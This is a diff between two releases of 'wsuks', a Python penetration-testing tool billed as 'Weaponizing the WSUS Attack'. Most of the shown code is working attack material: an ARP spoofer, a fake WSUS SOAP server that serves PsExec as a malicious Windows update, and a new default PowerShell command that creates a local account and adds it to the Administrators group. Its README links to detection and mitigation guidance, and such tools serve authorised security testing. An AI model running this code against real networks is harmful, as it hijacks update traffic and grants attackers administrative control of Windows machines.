# Comparing `tmp/wsuks-0.2.1.tar.gz` & `tmp/wsuks-0.2.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "wsuks-0.2.1.tar", max compression
+gzip compressed data, was "wsuks-0.2.2.tar", max compression
```

## Comparing `wsuks-0.2.1.tar` & `wsuks-0.2.2.tar`

### file list

```diff
@@ -1,23 +1,23 @@
--rw-r--r--   0        0        0     1301 2023-04-06 19:28:11.193610 wsuks-0.2.1/LICENSE
--rw-r--r--   0        0        0     1858 2023-07-01 17:32:37.749637 wsuks-0.2.1/README.md
--rw-r--r--   0        0        0      507 2023-07-01 17:34:10.469639 wsuks-0.2.1/pyproject.toml
--rw-r--r--   0        0        0        0 2023-07-01 15:16:02.001468 wsuks-0.2.1/wsuks/__init__.py
--rw-r--r--   0        0        0   717232 2023-03-30 14:57:14.000000 wsuks-0.2.1/wsuks/executables/PsExec.exe
--rw-r--r--   0        0        0   831888 2023-03-30 14:57:14.000000 wsuks-0.2.1/wsuks/executables/PsExec64.exe
--rw-r--r--   0        0        0        0 2023-03-19 17:44:56.143981 wsuks-0.2.1/wsuks/helpers/__init__.py
--rw-r--r--   0        0        0     3056 2023-07-01 16:04:00.893527 wsuks-0.2.1/wsuks/helpers/argparser.py
--rw-r--r--   0        0        0     3080 2023-07-01 16:14:59.221541 wsuks-0.2.1/wsuks/helpers/arpspoofer.py
--rw-r--r--   0        0        0     1697 2023-04-02 21:07:58.692346 wsuks-0.2.1/wsuks/helpers/logger.py
--rw-r--r--   0        0        0     3354 2023-07-01 16:23:15.421551 wsuks-0.2.1/wsuks/helpers/sysvolparser.py
--rw-r--r--   0        0        0    10679 2023-07-01 16:14:34.285540 wsuks-0.2.1/wsuks/helpers/wsusserver.py
--rw-r--r--   0        0        0     2945 2023-07-01 17:30:58.501635 wsuks-0.2.1/wsuks/wsuks.py
--rw-r--r--   0        0        0      583 2023-04-06 19:28:41.085610 wsuks-0.2.1/wsuks/xml_files/get-authorization-cookie.xml
--rw-r--r--   0        0        0      838 2023-04-06 19:28:44.697610 wsuks-0.2.1/wsuks/xml_files/get-config.xml
--rw-r--r--   0        0        0      526 2023-04-06 19:28:47.697610 wsuks-0.2.1/wsuks/xml_files/get-cookie.xml
--rw-r--r--   0        0        0     4247 2023-04-06 19:28:51.417611 wsuks-0.2.1/wsuks/xml_files/get-extended-update-info.xml
--rw-r--r--   0        0        0      469 2023-04-06 19:28:58.353611 wsuks-0.2.1/wsuks/xml_files/internal-error.xml
--rw-r--r--   0        0        0      364 2023-04-06 19:29:04.397611 wsuks-0.2.1/wsuks/xml_files/register-computer.xml
--rw-r--r--   0        0        0      418 2023-04-06 19:29:08.141611 wsuks-0.2.1/wsuks/xml_files/report-event-batch.xml
--rw-r--r--   0        0        0     3295 2023-04-06 19:29:12.273611 wsuks-0.2.1/wsuks/xml_files/sync-updates.xml
--rw-r--r--   0        0        0     2792 1970-01-01 00:00:00.000000 wsuks-0.2.1/setup.py
--rw-r--r--   0        0        0     2477 1970-01-01 00:00:00.000000 wsuks-0.2.1/PKG-INFO
+-rw-r--r--   0        0        0     1301 2023-04-06 19:28:11.193610 wsuks-0.2.2/LICENSE
+-rw-r--r--   0        0        0     2151 2023-07-04 20:57:09.903154 wsuks-0.2.2/README.md
+-rw-r--r--   0        0        0      507 2023-07-07 11:21:47.601548 wsuks-0.2.2/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-07-01 15:16:02.001468 wsuks-0.2.2/wsuks/__init__.py
+-rw-r--r--   0        0        0   717232 2023-03-30 14:57:14.000000 wsuks-0.2.2/wsuks/executables/PsExec.exe
+-rw-r--r--   0        0        0   831888 2023-03-30 14:57:14.000000 wsuks-0.2.2/wsuks/executables/PsExec64.exe
+-rw-r--r--   0        0        0        0 2023-03-19 17:44:56.143981 wsuks-0.2.2/wsuks/helpers/__init__.py
+-rw-r--r--   0        0        0     3283 2023-07-07 11:20:23.173546 wsuks-0.2.2/wsuks/helpers/argparser.py
+-rw-r--r--   0        0        0     3299 2023-07-02 21:55:54.610702 wsuks-0.2.2/wsuks/helpers/arpspoofer.py
+-rw-r--r--   0        0        0     1697 2023-04-02 21:07:58.692346 wsuks-0.2.2/wsuks/helpers/logger.py
+-rw-r--r--   0        0        0     3354 2023-07-01 16:23:15.421551 wsuks-0.2.2/wsuks/helpers/sysvolparser.py
+-rw-r--r--   0        0        0    10326 2023-07-03 00:53:29.390923 wsuks-0.2.2/wsuks/helpers/wsusserver.py
+-rw-r--r--   0        0        0     3285 2023-07-07 11:21:39.089548 wsuks-0.2.2/wsuks/wsuks.py
+-rw-r--r--   0        0        0      583 2023-04-06 19:28:41.085610 wsuks-0.2.2/wsuks/xml_files/get-authorization-cookie.xml
+-rw-r--r--   0        0        0      838 2023-04-06 19:28:44.697610 wsuks-0.2.2/wsuks/xml_files/get-config.xml
+-rw-r--r--   0        0        0      526 2023-04-06 19:28:47.697610 wsuks-0.2.2/wsuks/xml_files/get-cookie.xml
+-rw-r--r--   0        0        0     4247 2023-04-06 19:28:51.417611 wsuks-0.2.2/wsuks/xml_files/get-extended-update-info.xml
+-rw-r--r--   0        0        0      469 2023-04-06 19:28:58.353611 wsuks-0.2.2/wsuks/xml_files/internal-error.xml
+-rw-r--r--   0        0        0      364 2023-04-06 19:29:04.397611 wsuks-0.2.2/wsuks/xml_files/register-computer.xml
+-rw-r--r--   0        0        0      418 2023-04-06 19:29:08.141611 wsuks-0.2.2/wsuks/xml_files/report-event-batch.xml
+-rw-r--r--   0        0        0     3295 2023-04-06 19:29:12.273611 wsuks-0.2.2/wsuks/xml_files/sync-updates.xml
+-rw-r--r--   0        0        0     3092 1970-01-01 00:00:00.000000 wsuks-0.2.2/setup.py
+-rw-r--r--   0        0        0     2770 1970-01-01 00:00:00.000000 wsuks-0.2.2/PKG-INFO
```

### Comparing `wsuks-0.2.1/LICENSE` & `wsuks-0.2.2/LICENSE`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/README.md` & `wsuks-0.2.2/README.md`

 * *Files 17% similar despite different names*

```diff
@@ -1,22 +1,30 @@
 ![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)
 # wsuks
 _Weaponizing the WSUS Attack_
 
-Becoming local Admin on a domain joined Windows Machine is usually the first step to obtain domain admin privileges in a pentest. To utilize the WSUS attack automatically this Tool spoofs the ip address of the WSUS-Server inside the network via arp and serves its own Windows Update as soon as the client requests them.
-Per Default a Windows Client requests Updates every 24h. On request wsuks provides its own "Updates" executing Powershell commands on the target to create an local Admin and add it to the local Administrators group.
+Gaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.
+By default, a Windows client requests updates every 24 hours. 
 
-The served executable (Default: PsExec64.exe) as well as the executed command can be changed as needed.
+Both the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.
+
+Prerequisits:
+- The target Client must be on the local network
+- The Windows Server Update Service (WSUS) must be configured using HTTP
+
+Result:
+- After successful execution a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created and added to the local admin group
 
 ## Installation
 Using pipx:
 ```
-sudo apt install python3-pipx git
-sudo pipx ensurepath
-sudo pipx install wsuks
+sudo apt install python3-pipx
+pipx ensurepath
+pipx install wsuks
+sudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks
 ```
 
 Using poetry:
 ```
 sudo apt install python3-poetry
 git clone https://github.com/NeffIsBack/wsuks
 cd wsuks
@@ -24,17 +32,16 @@
 ```
 
 ## Usage
 ❗wsuks must be run as root❗
 
 With pipx:
 ```
-sudo -i
-wsuks
-wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
+sudo wsuks
+suso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
 ```
 
 With poetry:
 ```
 sudo poetry run wsuks
 sudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
 ```
```

### Comparing `wsuks-0.2.1/wsuks/executables/PsExec.exe` & `wsuks-0.2.2/wsuks/executables/PsExec.exe`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/wsuks/executables/PsExec64.exe` & `wsuks-0.2.2/wsuks/executables/PsExec64.exe`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/wsuks/helpers/argparser.py` & `wsuks-0.2.2/wsuks/helpers/argparser.py`

 * *Files 9% similar despite different names*

```diff
@@ -23,27 +23,26 @@
                Made by NeffIsBack
                  Version: {__version__}
 """)
 
 
 def initParser():
     example_text = """Examples:
+    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2
     wsuks -t 192.168.0.10 -u User -p Password123 -dc-ip 192.168.0.1
-    wsuks -t 192.168.0.10 -u User -p Password123 -dc-ip 192.168.0.1 -c "dir"
-    wsuks -t 192-168-0-10 --WSUS-Server 192.168.0.2 -c "dir"
     """
     parser = argparse.ArgumentParser(prog='wsuks', epilog=example_text, formatter_class=RawTextHelpFormatter)
 
     parser.add_argument('-v', '--version', action='version', version='Current Version: %(prog)s 2.0')
     parser.add_argument('-d', '--debug', action='store_true', help='Enable debug output')
 
     parser.add_argument('-t', '--target-ip', metavar='', dest='targetIp', help='IP Address of the victim Client. (REQUIRED)', required=True)
     parser.add_argument('-I', '--interface', metavar='', help='Network Interface to use. (DEFAULT: %(default)s)', default='eth0')
     parser.add_argument('-e', '--executable', metavar='', default=f'{dirname(wsuks.__file__)}/executables/PsExec64.exe',type=argparse.FileType('rb'), help='The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)')
-    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='whoami')
+    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='/accepteula /s powershell.exe \'New-LocalUser -Name "WSUKS_USER" -Password $(ConvertTo-SecureString "WSUKS_PASSWORD" -AsPlainText -Force) -Fullname "wsuks user" -Description "This user was generated by the wsuks Tool"; Add-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member "WSUKS_USER"\'')
 
     simple = parser.add_argument_group('AUTOMATIC MODE', 'Discover the WSUS Server automatically by searching for GPOs in SYSVOL. (Default)')
     simple.add_argument('-u', '--username', metavar='', help='Username to authenticate with. (Required in automatic Mode)')
     simple.add_argument('-p', '--password', metavar='', help='Password to authenticate with. (Required in automatic Mode)')
     simple.add_argument('-dc-ip', metavar='', dest='dcIp', help='IP Address of the domain controller. (Required in automatic Mode)')
     simple.add_argument('--domain', metavar='', help='Domain to authenticate with. (Optional)')
```

### Comparing `wsuks-0.2.1/wsuks/helpers/arpspoofer.py` & `wsuks-0.2.2/wsuks/helpers/arpspoofer.py`

 * *Files 9% similar despite different names*

```diff
@@ -24,37 +24,40 @@
         """
         Spoof the target's ARP table by sending a fake ARP response with our MAC address as the sender.
         
         :param targetIp: The victim's IP address
         :param spoofIp: The IP address to spoof
         """
         targetMac = scapy.getmacbyip(targetIp)
+        self.logger.debug(f"Target IP address: {targetIp}")
+        self.logger.debug(f"Target MAC address: {targetMac}")
         if targetMac == None:
             self.logger.error(f"ARP request for IP address {targetIp} failed! Target is not reachable!")
             sys.exit(1)
         else:
             while self.isRunning:
-                self.logger.debug(f"Sending ARP response to {targetIp} with spoofed IP address {spoofIp}")
-                packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
+                self.logger.debug(f"Tell target {targetIp} that spoofed IP address {spoofIp} is at our MAC address")
+                packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=(spoofIp))
                 scapy.send(packet, verbose=False)
                 time.sleep(1)
 
-    def _restore(self, destination_ip, source_ip):
+    def _restore(self, targetIp, source_ip):
         """
         Restore the target's ARP table by sending a real ARP response.
         This is done by sending the target the spoofed IP address and the real MAC address of the spoofed IP address.
 
-        :param destination_ip: The victim's IP address
+        :param targetIp: The victim's IP address
         :param source_ip: The spoofed IP address
         """
         try:
-            self.logger.info(f"Restoring ARP tables for target {destination_ip} and spoofed IP address {source_ip}")
-            destination_mac = scapy.getmacbyip(destination_ip)
+            self.logger.info(f"Restoring ARP tables for target {targetIp} and spoofed IP address {source_ip}")
+            self.logger.debug(f"Tell target {targetIp} the correct MAC-Adress for spoofed IP address {source_ip}")
+            destination_mac = scapy.getmacbyip(targetIp)
             source_mac = scapy.getmacbyip(source_ip)
-            packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+            packet = scapy.ARP(op=2, pdst=targetIp, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
             scapy.send(packet, verbose=False)
         except Exception as e:
             self.logger.error(f"Error while restoring ARP tables: {e}")
             if self.logger.level == logging.DEBUG:
                 traceback.print_exc()
 
     def start(self, targetIp, spoofIp):
```

### Comparing `wsuks-0.2.1/wsuks/helpers/logger.py` & `wsuks-0.2.2/wsuks/helpers/logger.py`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/wsuks/helpers/sysvolparser.py` & `wsuks-0.2.2/wsuks/helpers/sysvolparser.py`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/wsuks/helpers/wsusserver.py` & `wsuks-0.2.2/wsuks/helpers/wsusserver.py`

 * *Files 8% similar despite different names*

```diff
@@ -53,48 +53,54 @@
     def set_resources_xml(self, command):
         self.command = command
         # init resources
 
         path = os.path.abspath(os.path.dirname(wsuks.__file__))
 
         try:
-            with open('{}/xml_files/get-config.xml'.format(path), 'r') as file:
+            with open(f'{path}/xml_files/get-config.xml', 'r') as file:
                 self.get_config_xml = file.read().format(lastChange=self.get_last_change())
                 file.close()
 
-            with open('{}/xml_files/get-cookie.xml'.format(path), 'r') as file:
+            with open(f'{path}/xml_files/get-cookie.xml', 'r') as file:
                 self.get_cookie_xml = file.read().format(expire=self.get_expire(), cookie=self.get_cookie())
                 file.close()
 
-            with open('{}/xml_files/register-computer.xml'.format(path), 'r') as file:
+            with open(f'{path}/xml_files/register-computer.xml', 'r') as file:
                 self.register_computer_xml = file.read()
                 file.close()
 
-            with open('{}/xml_files/sync-updates.xml'.format(path), 'r') as file:
+            with open(f'{path}/xml_files/sync-updates.xml', 'r') as file:
                 # TODO KB1234567 -> dynamic
-                self.sync_updates_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
-                                                           deployment_id1=self.deployment_ids[0], deployment_id2=self.deployment_ids[1],
-                                                           uuid1=self.uuids[0], uuid2=self.uuids[1], expire=self.get_expire(), cookie=self.get_cookie())
+                self.sync_updates_xml = file.read().format(revision_id1=self.revision_ids[0],
+                                                           revision_id2=self.revision_ids[1],
+                                                           deployment_id1=self.deployment_ids[0],
+                                                           deployment_id2=self.deployment_ids[1],
+                                                           uuid1=self.uuids[0],
+                                                           uuid2=self.uuids[1],
+                                                           expire=self.get_expire(),
+                                                           cookie=self.get_cookie())
                 file.close()
 
-            with open('{}/xml_files/get-extended-update-info.xml'.format(path), 'r') as file:
+            with open(f'{path}/xml_files/get-extended-update-info.xml', 'r') as file:
                 self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0],
                                                                        revision_id2=self.revision_ids[1],
-                                                                       sha1=self.sha1, sha256=self.sha256,
+                                                                       sha1=self.sha1,
+                                                                       sha256=self.sha256,
                                                                        filename=self.executable_name,
                                                                        file_size=len(self.executable),
                                                                        command=html.escape(html.escape(self.command)),
                                                                        url=f'http://{self.client_address}/{uuid.uuid4()}/{self.executable_name}')
                 file.close()
 
-            with open('{}/xml_files/report-event-batch.xml'.format(path), 'r') as file:
+            with open(f'{path}/xml_files/report-event-batch.xml', 'r') as file:
                 self.report_event_batch_xml = file.read()
                 file.close()
 
-            with open('{}/xml_files/get-authorization-cookie.xml'.format(path), 'r') as file:
+            with open(f'{path}/xml_files/get-authorization-cookie.xml', 'r') as file:
                 self.get_authorization_cookie_xml = file.read().format(cookie=self.get_cookie())
                 file.close()
 
         except Exception as err:
             self.logger.error(f'Error: {err}')
             if self.logger.level == logging.DEBUG:
                 traceback.print_exc()
@@ -141,39 +147,39 @@
             self.send_header('Content-type', 'text/xml; chartset=utf-8')
 
         self.send_header('X-AspNet-Version', '4.0.30319')
         self.send_header('X-Powered-By', 'ASP.NET')
         self.end_headers()
 
     def do_HEAD(self):
-        self.logger.debug('HEAD request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
+        self.logger.debug(f'HEAD request,\nPath: {self.path}\nHeaders:\n{self.headers}\n')
 
         if self.path.find(".exe"):
-            self.logger.info("Requested: {path}".format(path=self.path))
+            self.logger.info(f"Requested: {self.path}")
 
             self._set_response(True)
 
     def do_GET(self):
-        self.logger.debug('GET request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
+        self.logger.debug(f'GET request,\nPath: {self.path}\nHeaders:\n{self.headers}\n')
 
         if self.path.find(".exe"):
-            self.logger.info("Requested: {path}".format(path=self.path))
+            self.logger.info(f"Requested: {self.path}")
 
             self._set_response(True)
             self.wfile.write(self.wsusUpdateHandler.executable)
 
     def do_POST(self):
 
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
 
         post_data_xml = BeautifulSoup(post_data, "xml")
         data = None
 
-        self.logger.debug("POST Request,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=post_data_xml.encode_contents()))
+        self.logger.debug(f"POST Request,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{post_data_xml.encode_contents()}\n")
 
         soap_action = self.headers['SOAPAction']
 
         if soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b76899b4-ad55-427d-a748-2ecf0829412b
             data = BeautifulSoup(self.wsusUpdateHandler.get_config_xml, 'xml')
 
@@ -194,30 +200,27 @@
             data = BeautifulSoup(self.wsusUpdateHandler.get_extended_update_info_xml, "xml")
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/da9f0561-1e57-4886-ad05-57696ec26a78
             data = BeautifulSoup(self.wsusUpdateHandler.report_event_batch_xml, "xml")
 
             post_data_report = BeautifulSoup(post_data, "xml")
-            self.logger.info('Client Report: {targetID}, {computerBrand}, {computerModel}, {extendedData}.'.format(targetID=post_data_report.TargetID.text,
-                                                                                                                   computerBrand=post_data_report.ComputerBrand.text,
-                                                                                                                   computerModel=post_data_report.ComputerModel.text,
-                                                                                                                   extendedData=post_data_report.ExtendedData.ReplacementStrings.string))
+            self.logger.info(f'Client Report: {post_data_report.TargetID.text}, {post_data_report.ComputerBrand.text}, {post_data_report.ComputerModel.text}, {post_data_report.ExtendedData.ReplacementStrings.string}.')
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/44767c55-1e41-4589-aa01-b306e0134744
             data = BeautifulSoup(self.wsusUpdateHandler.get_authorization_cookie_xml, "xml")
 
         else:
             self.logger.warning("SOAP Action not handled")
-            self.logger.info('SOAP Action: {}'.format(soap_action))
+            self.logger.info(f'SOAP Action: {soap_action}')
             return
 
         self._set_response()
         self.wfile.write(data.encode_contents())
 
-        self.logger.info('SOAP Action: {}'.format(soap_action))
+        self.logger.info(f'SOAP Action: {soap_action}')
 
         if data is not None:
-            self.logger.debug("POST Response,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=data.encode_contents))
+            self.logger.debug(f"POST Response,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{data.encode_contents}\n")
         else:
             self.logger.warning("POST Response without data.")
```

### Comparing `wsuks-0.2.1/wsuks/wsuks.py` & `wsuks-0.2.2/wsuks/wsuks.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,32 +1,37 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 from http.server import HTTPServer
 import logging
 import os
+from pprint import pformat
+import random
+from string import digits, ascii_letters
 from scapy.all import get_if_addr, sniff
 from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
 from wsuks.helpers.argparser import initParser, printBanner
 from wsuks.helpers.sysvolparser import SysvolParser
 from wsuks.helpers.wsusserver import WSUSUpdateHandler
 
 
 class Wsuks:
     def __init__(self, args):
         self.logger = logging.getLogger()
         self.hostIp = get_if_addr(args.interface)
+        self.username = "user" + "".join(random.choice(digits) for i in range(5))
+        self.password = "".join(random.sample(ascii_letters, 16))
 
         # Set args
         self.targetIp = args.targetIp  # Never None (required)
         self.executable_file = args.executable.read()
         self.executable_name = os.path.basename(args.executable.name)
         args.executable.close()
-        self.command = args.command
+        self.command = args.command.replace("WSUKS_USER", self.username).replace("WSUKS_PASSWORD", self.password)
 
         self.wsusIp = args.wsusIp
         self.wsusPort = args.wsusPort  # Default 8530
         self.username = args.username
         self.password = args.password
         self.domain = args.domain
         self.dcIp = args.dcIp
@@ -38,15 +43,15 @@
             self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
             self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.username, self.password, self.dcIp)
         else:
             self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
 
         # Start Arp Spoofing
         arpspoofer = ArpSpoofer()
-        arpspoofer.start(self.targetIp, "192.168.0.1")
+        arpspoofer.start(self.targetIp, self.wsusIp)
 
         # Prepare WSUS Update Handler
         # sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
         update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}', self.logger)
         update_handler.set_resources_xml(self.command)
 
         self.logger.debug(update_handler)
@@ -69,15 +74,15 @@
 def main():
     # Setup
     printBanner()
     args = initParser()
 
     initLogger(debug=args.debug)
     logger = logging.getLogger('wsuks')
-    logger.debug(args)
+    logger.debug('Passed args:\n' + pformat(vars(args)))
     
     # Prevent scapy from logging to console
     scapyLogger = logging.getLogger('scapy')
     scapyLogger.handlers.clear()
 
     if os.geteuid() != 0:
         logger.error("This script must be run as root!")
```

### Comparing `wsuks-0.2.1/wsuks/xml_files/get-authorization-cookie.xml` & `wsuks-0.2.2/wsuks/xml_files/get-authorization-cookie.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/wsuks/xml_files/get-config.xml` & `wsuks-0.2.2/wsuks/xml_files/get-config.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/wsuks/xml_files/get-cookie.xml` & `wsuks-0.2.2/wsuks/xml_files/get-cookie.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/wsuks/xml_files/get-extended-update-info.xml` & `wsuks-0.2.2/wsuks/xml_files/get-extended-update-info.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/wsuks/xml_files/sync-updates.xml` & `wsuks-0.2.2/wsuks/xml_files/sync-updates.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.1/setup.py` & `wsuks-0.2.2/setup.py`

 * *Files 12% similar despite different names*

```diff
@@ -14,17 +14,17 @@
  'termcolor>=2.2.0,<3.0.0']
 
 entry_points = \
 {'console_scripts': ['wsuks = wsuks.wsuks:main']}
 
 setup_kwargs = {
     'name': 'wsuks',
-    'version': '0.2.1',
+    'version': '0.2.2',
     'description': 'A Tool for automating the MITM attack on the WSUS connection',
-    'long_description': '![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)\n# wsuks\n_Weaponizing the WSUS Attack_\n\nBecoming local Admin on a domain joined Windows Machine is usually the first step to obtain domain admin privileges in a pentest. To utilize the WSUS attack automatically this Tool spoofs the ip address of the WSUS-Server inside the network via arp and serves its own Windows Update as soon as the client requests them.\nPer Default a Windows Client requests Updates every 24h. On request wsuks provides its own "Updates" executing Powershell commands on the target to create an local Admin and add it to the local Administrators group.\n\nThe served executable (Default: PsExec64.exe) as well as the executed command can be changed as needed.\n\n## Installation\nUsing pipx:\n```\nsudo apt install python3-pipx git\nsudo pipx ensurepath\nsudo pipx install wsuks\n```\n\nUsing poetry:\n```\nsudo apt install python3-poetry\ngit clone https://github.com/NeffIsBack/wsuks\ncd wsuks\nsudo poetry install\n```\n\n## Usage\n❗wsuks must be run as root❗\n\nWith pipx:\n```\nsudo -i\nwsuks\nwsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20\n```\n\nWith poetry:\n```\nsudo poetry run wsuks\nsudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20\n```\n\n## About & Mitigation\nIn the [PyWSUS](https://github.com/GoSecure/pywsus) Repository from GoSecure you can find a great documentation how to you could detect and mitigate this attack.\nThey also wrote a great Guide demonstrating how this attack works in detail [here](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/).\n\nThis Tool is based on the following projects:\n- https://github.com/GoSecure/pywsus\n- https://github.com/GoSecure/wsuspect-proxy\n\n',
+    'long_description': '![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)\n# wsuks\n_Weaponizing the WSUS Attack_\n\nGaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.\nBy default, a Windows client requests updates every 24 hours. \n\nBoth the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.\n\nPrerequisits:\n- The target Client must be on the local network\n- The Windows Server Update Service (WSUS) must be configured using HTTP\n\nResult:\n- After successful execution a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created and added to the local admin group\n\n## Installation\nUsing pipx:\n```\nsudo apt install python3-pipx\npipx ensurepath\npipx install wsuks\nsudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks\n```\n\nUsing poetry:\n```\nsudo apt install python3-poetry\ngit clone https://github.com/NeffIsBack/wsuks\ncd wsuks\nsudo poetry install\n```\n\n## Usage\n❗wsuks must be run as root❗\n\nWith pipx:\n```\nsudo wsuks\nsuso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20\n```\n\nWith poetry:\n```\nsudo poetry run wsuks\nsudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20\n```\n\n## About & Mitigation\nIn the [PyWSUS](https://github.com/GoSecure/pywsus) Repository from GoSecure you can find a great documentation how to you could detect and mitigate this attack.\nThey also wrote a great Guide demonstrating how this attack works in detail [here](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/).\n\nThis Tool is based on the following projects:\n- https://github.com/GoSecure/pywsus\n- https://github.com/GoSecure/wsuspect-proxy\n\n',
     'author': 'Alexander Neff',
     'author_email': 'alex99.neff@gmx.de',
     'maintainer': 'None',
     'maintainer_email': 'None',
     'url': 'None',
     'packages': packages,
     'package_data': package_data,
```

### Comparing `wsuks-0.2.1/PKG-INFO` & `wsuks-0.2.2/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: wsuks
-Version: 0.2.1
+Version: 0.2.2
 Summary: A Tool for automating the MITM attack on the WSUS connection
 License: MIT
 Author: Alexander Neff
 Author-email: alex99.neff@gmx.de
 Requires-Python: >=3.10,<4.0
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
@@ -16,25 +16,33 @@
 Requires-Dist: termcolor (>=2.2.0,<3.0.0)
 Description-Content-Type: text/markdown
 
 ![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)
 # wsuks
 _Weaponizing the WSUS Attack_
 
-Becoming local Admin on a domain joined Windows Machine is usually the first step to obtain domain admin privileges in a pentest. To utilize the WSUS attack automatically this Tool spoofs the ip address of the WSUS-Server inside the network via arp and serves its own Windows Update as soon as the client requests them.
-Per Default a Windows Client requests Updates every 24h. On request wsuks provides its own "Updates" executing Powershell commands on the target to create an local Admin and add it to the local Administrators group.
+Gaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.
+By default, a Windows client requests updates every 24 hours. 
 
-The served executable (Default: PsExec64.exe) as well as the executed command can be changed as needed.
+Both the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.
+
+Prerequisits:
+- The target Client must be on the local network
+- The Windows Server Update Service (WSUS) must be configured using HTTP
+
+Result:
+- After successful execution a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created and added to the local admin group
 
 ## Installation
 Using pipx:
 ```
-sudo apt install python3-pipx git
-sudo pipx ensurepath
